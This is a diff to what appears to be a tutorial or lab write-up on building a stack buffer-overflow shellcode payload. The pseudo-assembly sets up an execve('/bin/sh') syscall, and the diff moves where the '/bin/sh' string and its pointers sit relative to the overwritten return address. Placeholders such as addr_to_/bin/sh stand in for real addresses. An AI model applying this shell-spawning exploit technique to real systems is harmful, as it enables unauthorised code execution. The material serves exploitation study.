@@ -34,8 +34,9 @@ push $59
 pop %rax  
 push addr_to_/bin/sh  
 pop %rdi  
-[ /bin/sh somewhere + buffer bytes ]  
+[ buffer bytes ]  
 [modified ret addr to instructions ]  
+/bin/sh somewhere
 ### Third step  
 Third step is we need to pass in a pointer to our list of pointers to our parameters. Since we don't have any parameters and just want to run /bin/sh, we can point to the pointer referencing /bin/sh and end it with a null value.  
 Payload so far:  
@@ -45,8 +46,9 @@ push addr_to_/bin/sh
 pop %rdi  
 push addr_to_pointer_to_/bin/sh  
 pop %rsi  
-[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]  
+[ buffer bytes ]  
 [modified ret addr to instructions ]  
+/bin/sh somewhere + pointer to /bin/sh + 8 null bytes  
 ### Fourth step
 We can just pass a null value into our third parameter since we're not using it.  
 Payload so far:  
@@ -57,8 +59,9 @@ pop %rdi
 push addr_to_pointer_to_/bin/sh  
 pop %rsi  
 xorq %rdx,%rdx  
-[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]  
+[ buffer bytes ]  
 [modified ret addr to instructions ]  
+/bin/sh somewhere + pointer to /bin/sh + 8 null bytes  
 ### Final step
 We can just finally call syscall in our final instruction.  
 push $59  
@@ -69,5 +72,6 @@ push addr_to_pointer_to_/bin/sh
 pop %rsi  
 xorq %rdx,%rdx  
 syscall  
-[ /bin/sh somewhere + pointer to /bin/sh + 8 null bytes +  buffer bytes ]  
-[modified ret addr to instructions ]
+[ buffer bytes ]  
+[modified ret addr to instructions ]  
+/bin/sh somewhere + pointer to /bin/sh + 8 null bytes
